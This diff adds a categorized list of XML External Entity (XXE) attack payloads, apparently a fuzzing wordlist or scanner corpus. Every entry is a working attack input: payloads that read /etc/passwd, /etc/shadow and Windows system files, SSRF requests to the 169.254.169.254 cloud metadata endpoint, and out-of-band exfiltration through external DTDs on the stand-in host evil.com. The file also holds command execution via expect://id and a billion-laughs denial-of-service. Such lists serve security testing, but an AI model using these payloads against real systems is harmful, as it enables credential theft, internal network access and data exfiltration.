@@ -1,0 +1,55 @@
+# XML External Entity (XXE) Payloads
+# Targets: XML parsers that process external entities
+
+# === Basic XXE ===
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>
+
+# === Windows XXE ===
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><foo>&xxe;</foo>
+
+# === XXE via HTTP ===
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>
+
+# === Blind XXE / Out-of-Band ===
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">%xxe;]><foo>test</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/?data=test">]><foo>&xxe;</foo>
+
+# === Parameter Entity Expansion ===
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">%dtd;%send;]><foo>bar</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % a "<!ENTITY &#x25; b SYSTEM 'http://evil.com/?x=%a;'>">%a;%b;]><foo/>
+
+# === Billion Laughs (DoS) ===
+<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;">]><lolz>&lol3;</lolz>
+
+# === XXE in SOAP ===
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>
+
+# === XXE in SVG ===
+<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
+
+# === XXE with PHP Wrappers ===
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>
+
+# === XXE with FTP ===
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://evil.com/xxe">]><foo>&xxe;</foo>
+
+# === XXE with CDATA ===
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY start "<![CDATA["><!ENTITY end "]]>"><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&start;&xxe;&end;</foo>
+
+# === Fragments / Partial XXE ===
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+<!DOCTYPE test [<!ENTITY % init SYSTEM "http://evil.com/evil.dtd">]>
+SYSTEM "file:///etc/passwd"
+SYSTEM "http://evil.com/xxe"
+<!ENTITY
+<!DOCTYPE
+
+# === XXE via Content-Type manipulation ===
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><stockCheck><productId>&xxe;</productId></stockCheck>
+<?xml version="1.0"?><!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd">]><userInfo><firstName>&ent;</firstName></userInfo>
